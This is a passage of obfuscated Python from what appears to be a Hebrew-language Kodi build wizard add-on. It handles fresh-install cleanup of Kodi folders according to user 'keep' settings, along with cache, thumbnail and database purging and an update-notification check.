				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'skin.anonymous.mod'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4891
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'skin.Premium.mod'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4892
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'skin.anonymous.nox'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4893
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'skin.phenomenal'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4894
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'plugin.video.metalliq'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4895
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'skin.titan'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPSKIN3 =='true':wiz .log ("Install titan: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4897
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'pvr.iptvsimple'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPPVR =='true':wiz .log ("Keep Pvr: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4898
				elif O000O000O0O00OO0O =='sources.xml'and O0000O0OOO0O000OO [-1 ]=='userdata'and KEEPSOURCES =='true':wiz .log ("Keep Sources: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4900
				elif O000O000O0O00OO0O =='quicknav.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPTVLIST =='true':wiz .log ("Keep Tv List: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4903
				elif O000O000O0O00OO0O =='x1101.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4904
				elif O000O000O0O00OO0O =='b-srtym-b.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBMOVIE =='true':wiz .log ("Keep Hub Movie: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4905
				elif O000O000O0O00OO0O =='x1102.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4906
				elif O000O000O0O00OO0O =='b-sdrvt-b.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBTVSHOW =='true':wiz .log ("Keep Hub Tvshow: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4907
				elif O000O000O0O00OO0O =='x1112.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4908
				elif O000O000O0O00OO0O =='b-tlvvyzyh-b.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBTV =='true':wiz .log ("Keep Hub Tv: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4909
				elif O000O000O0O00OO0O =='x1111.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4910
				elif O000O000O0O00OO0O =='b-tvknyshrly-b.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBVOD =='true':wiz .log ("Keep Hub Vod: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4911
				elif O000O000O0O00OO0O =='x1110.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4912
				elif O000O000O0O00OO0O =='b-yldym-b.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBKIDS =='true':wiz .log ("Keep Hub Kids: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4913
				elif O000O000O0O00OO0O =='x1114.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4914
				elif O000O000O0O00OO0O =='b-mvzyqh-b.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBMUSIC =='true':wiz .log ("Keep Hub Music: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4915
				elif O000O000O0O00OO0O =='mainmenu.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4916
				elif O000O000O0O00OO0O =='skin.Premium.mod.properties'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBMENU =='true':wiz .log ("Keep Hub Menu: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4917
				elif O000O000O0O00OO0O =='x1122.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4919
				elif O000O000O0O00OO0O =='b-spvrt-b.DATA.xml'and O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'script.skinshortcuts'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPHUBSPORT =='true':wiz .log ("Keep Hub Sport: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4920
				elif O000O000O0O00OO0O =='favourites.xml'and O0000O0OOO0O000OO [-1 ]=='userdata'and KEEPFAVS =='true':wiz .log ("Keep Favourites: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4925
				elif O000O000O0O00OO0O =='guisettings.xml'and O0000O0OOO0O000OO [-1 ]=='userdata'and KEEPSOUND =='true':wiz .log ("Keep Sound: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4927
				elif O000O000O0O00OO0O =='profiles.xml'and O0000O0OOO0O000OO [-1 ]=='userdata'and KEEPPROFILES =='true':wiz .log ("Keep Profiles: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4928
				elif O000O000O0O00OO0O =='advancedsettings.xml'and O0000O0OOO0O000OO [-1 ]=='userdata'and KEEPADVANCED =='true':wiz .log ("Keep Advanced Settings: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4929
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'plugin.video.sdarot.tv'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4930
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'program.apollo'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4931
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'plugin.video.allmoviesin'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4932
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'plugin.video.elementum'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4935
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'service.subtitles.All_Subs'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4936
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'plugin.audio.soundcloud'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4937
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'weather.yahoo'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPWEATHER =='true':wiz .log ("Keep weather: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4938
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'plugin.video.quasar'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4939
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'program.apollo'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4940
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4941
				elif O0000O0OOO0O000OO [O0000O000OO0O000O -2 ]=='userdata'and O0000O0OOO0O000OO [O0000O000OO0O000O -1 ]=='addon_data'and 'plugin.video.playlistLoader'in O0000O0OOO0O000OO [O0000O000OO0O000O ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4942
				elif O000O000O0O00OO0O in LOGFILES :wiz .log ("Keep Log File: %s"%O000O000O0O00OO0O ,xbmc .LOGNOTICE )#line:4943
				elif O000O000O0O00OO0O .endswith ('.db'):#line:4944
					try :#line:4945
						if O000O000O0O00OO0O ==O0O0OOOOO0OOO000O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(O000O000O0O00OO0O ,KODIV ),xbmc .LOGNOTICE )#line:4946
						else :os .remove (os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ))#line:4947
					except Exception as OOOO00000O00000OO :#line:4948
						if not O000O000O0O00OO0O .startswith ('Textures13'):#line:4949
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4950
							wiz .log ("-> %s"%(str (OOOO00000O00000OO )),xbmc .LOGNOTICE )#line:4951
							wiz .purgeDb (os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ))#line:4952
				else :#line:4953
					DP .update (int (wiz .percentage (O0O00OO0O000OOO0O ,O00O000O00OO000OO )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000O000O0O00OO0O ),'')#line:4954
					try :os .remove (os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ))#line:4955
					except Exception as OOOO00000O00000OO :#line:4956
						wiz .log ("Error removing %s"%os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),xbmc .LOGNOTICE )#line:4957
						wiz .log ("-> / %s"%(str (OOOO00000O00000OO )),xbmc .LOGNOTICE )#line:4958
			if DP .iscanceled ():#line:4959
				DP .close ()#line:4960
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4961
				return False #line:4962
		for O00000O0O00OOO0OO ,O000OOOOO00O00000 ,OO0000OOO0O000OOO in os .walk (O0OO000OO00OOOO00 ,topdown =True ):#line:4963
			O000OOOOO00O00000 [:]=[O00O0OOO000OO0000 for O00O0OOO000OO0000 in O000OOOOO00O00000 if O00O0OOO000OO0000 not in EXCLUDES ]#line:4964
			for O000O000O0O00OO0O in O000OOOOO00O00000 :#line:4965
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O000O000O0O00OO0O ),'')#line:4966
			  if O000O000O0O00OO0O not in ["Database","userdata","temp","addons","addon_data"]:#line:4967
			   if not (O000O000O0O00OO0O =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4968
			    if not (O000O000O0O00OO0O =='skin.titan'and KEEPSKIN3 =='true'):#line:4970
			      if not (O000O000O0O00OO0O =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4971
			       if not (O000O000O0O00OO0O =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4972
			        if not (O000O000O0O00OO0O =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4973
			         if not (O000O000O0O00OO0O =='program.apollo'and KEEPINFO =='true'):#line:4974
			          if not (O000O000O0O00OO0O =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4975
			           if not (O000O000O0O00OO0O =='weather.yahoo'and KEEPWEATHER =='true'):#line:4976
			            if not (O000O000O0O00OO0O =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4977
			             if not (O000O000O0O00OO0O =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4978
			              if not (O000O000O0O00OO0O =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4979
			               if not (O000O000O0O00OO0O =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4980
			                if not (O000O000O0O00OO0O =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4981
			                 if not (O000O000O0O00OO0O =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4982
			                  if not (O000O000O0O00OO0O =='plugin.video.neptune'and KEEPINFO =='true'):#line:4983
			                   if not (O000O000O0O00OO0O =='plugin.video.youtube'and KEEPINFO =='true'):#line:4984
			                    if not (O000O000O0O00OO0O =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4985
			                     if not (O000O000O0O00OO0O =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4986
			                       if not (O000O000O0O00OO0O =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4988
			                           if not (O000O000O0O00OO0O =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4992
			                            if not (O000O000O0O00OO0O =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4993
			                             if not (O000O000O0O00OO0O =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4994
			                              if not (O000O000O0O00OO0O =='plugin.video.quasar'and KEEPINFO =='true'):#line:4995
			                               if not (O000O000O0O00OO0O =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4996
			                                  shutil .rmtree (os .path .join (O00000O0O00OOO0OO ,O000O000O0O00OO0O ),ignore_errors =True ,onerror =None )#line:4998
			if DP .iscanceled ():#line:4999
				DP .close ()#line:5000
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:5001
				return False #line:5002
		DP .close ()#line:5003
		wiz .clearS ('build')#line:5004
		if over ==True :#line:5005
			return True #line:5006
		elif install =='restore':#line:5007
			return True #line:5008
		elif install :#line:5009
			buildWizard (install ,'normal',over =True )#line:5010
		else :#line:5011
			if INSTALLMETHOD ==1 :OOOO00O00O0O000OO =1 #line:5012
			elif INSTALLMETHOD ==2 :OOOO00O00O0O000OO =0 #line:5013
			else :OOOO00O00O0O000OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:5014
			if OOOO00O00O0O000OO ==1 :wiz .reloadFix ('fresh')#line:5015
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:5016
	else :#line:5017
		if not install =='restore':#line:5018
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:5019
			wiz .refresh ()#line:5020
def clearCache ():#line:5025
		wiz .clearCache ()#line:5026
def fixwizard ():#line:5030
		wiz .fixwizard ()#line:5031
def totalClean ():#line:5033
		wiz .clearCache ()#line:5035
		wiz .clearPackages ('total')#line:5036
		clearThumb ('total')#line:5037
		cleanfornewbuild ()#line:5038
def cleanfornewbuild ():#line:5039
		try :#line:5040
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5041
		except :#line:5042
			pass #line:5043
		try :#line:5044
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5045
		except :#line:5046
			pass #line:5047
		try :#line:5048
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5049
		except :#line:5050
			pass #line:5051
def clearThumb (type =None ):#line:5052
	O0OO000O000OOOO00 =wiz .latestDB ('Textures')#line:5053
	if not type ==None :O0000O000OOO0O000 =1 #line:5054
	else :O0000O000OOO0O000 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O0OO000O000OOOO00 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5055
	if O0000O000OOO0O000 ==1 :#line:5056
		try :wiz .removeFile (os .join (DATABASE ,O0OO000O000OOOO00 ))#line:5057
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O0OO000O000OOOO00 )#line:5058
		wiz .removeFolder (THUMBS )#line:5059
	else :wiz .log ('Clear thumbnames cancelled')#line:5061
	wiz .redoThumbs ()#line:5062
def purgeDb ():#line:5064
	O0O00O00O0OO000O0 =[];OO0OOOOO00O00OO0O =[]#line:5065
	for O0OO00O0OOOOO000O ,O0000O000O0OOOO00 ,O00OOOO0OOO0O0OO0 in os .walk (HOME ):#line:5066
		for OOOOOO0000OO0O00O in fnmatch .filter (O00OOOO0OOO0O0OO0 ,'*.db'):#line:5067
			if OOOOOO0000OO0O00O !='Thumbs.db':#line:5068
				O0OOOO0O0O0OO00O0 =os .path .join (O0OO00O0OOOOO000O ,OOOOOO0000OO0O00O )#line:5069
				O0O00O00O0OO000O0 .append (O0OOOO0O0O0OO00O0 )#line:5070
				OO00O0OOOOO00OO00 =O0OOOO0O0O0OO00O0 .replace ('\\','/').split ('/')#line:5071
				OO0OOOOO00O00OO0O .append ('(%s) %s'%(OO00O0OOOOO00OO00 [len (OO00O0OOOOO00OO00 )-2 ],OO00O0OOOOO00OO00 [len (OO00O0OOOOO00OO00 )-1 ]))#line:5072
	if KODIV >=16 :#line:5073
		O0OO000O0OO00000O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0OOOOO00O00OO0O )#line:5074
		if O0OO000O0OO00000O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5075
		elif len (O0OO000O0OO00000O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5076
		else :#line:5077
			for OO00O0O000O0OO0OO in O0OO000O0OO00000O :wiz .purgeDb (O0O00O00O0OO000O0 [OO00O0O000O0OO0OO ])#line:5078
	else :#line:5079
		O0OO000O0OO00000O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OO0OOOOO00O00OO0O )#line:5080
		if O0OO000O0OO00000O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5081
		else :wiz .purgeDb (O0O00O00O0OO000O0 [OO00O0O000O0OO0OO ])#line:5082
def fastupdatefirstbuild (O000O0OOO0000OOOO ):#line:5088
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5090
	if ENABLE =='Yes':#line:5091
		if not NOTIFY =='true':#line:5092
			OO0O0OOOO0OOO0O0O =wiz .workingURL (NOTIFICATION )#line:5093
			if OO0O0OOOO0OOO0O0O ==True :#line:5094
				OOOO0000OO0O000OO ,OO00OOO000O0O0000 =wiz .splitNotify (NOTIFICATION )#line:5095
				if not OOOO0000OO0O000OO ==False :#line:5097
					try :#line:5098
						OOOO0000OO0O000OO =int (OOOO0000OO0O000OO );O000O0OOO0000OOOO =int (O000O0OOO0000OOOO )#line:5099
						checkidupdate ()#line:5100
						wiz .setS ("notedismiss","true")#line:5101
						if OOOO0000OO0O000OO ==O000O0OOO0000OOOO :#line:5102
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOOO0000OO0O000OO ),xbmc .LOGNOTICE )#line:5103
						elif OOOO0000OO0O000OO >O000O0OOO0000OOOO :#line:5105
							wiz .log ("[Notifications] id: %s"%str (OOOO0000OO0O000OO ),xbmc .LOGNOTICE )#line:5106
							wiz .setS ('noteid',str (OOOO0000OO0O000OO ))#line:5107
							wiz .setS ("notedismiss","true")#line:5108
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5111
					except Exception as O0O00OOO0OO0OOOO0 :#line:5112
						wiz .log ("Error on Notifications Window: %s"%str (O0O00OOO0OO0OOOO0 ),xbmc .LOGERROR )#line:5113
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5115
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OO0O0OOOO0OOO0O0O ),xbmc .LOGNOTICE )#line:5116
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5117
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5118
def checkidupdate ():#line:5124
				wiz .setS ("notedismiss","true")#line:5126
				OOO000OOOO000O0OO =wiz .workingURL (NOTIFICATION )#line:5127
				OOOOOO000O0OOOO0O =" Kodi Premium"#line:5129
				OO000OO000O00OO00 =wiz .checkBuild (OOOOOO000O0OOOO0O ,'gui')#line:5130
				OOOO0OOO0OOOOOO00 =OOOOOO000O0OOOO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5131
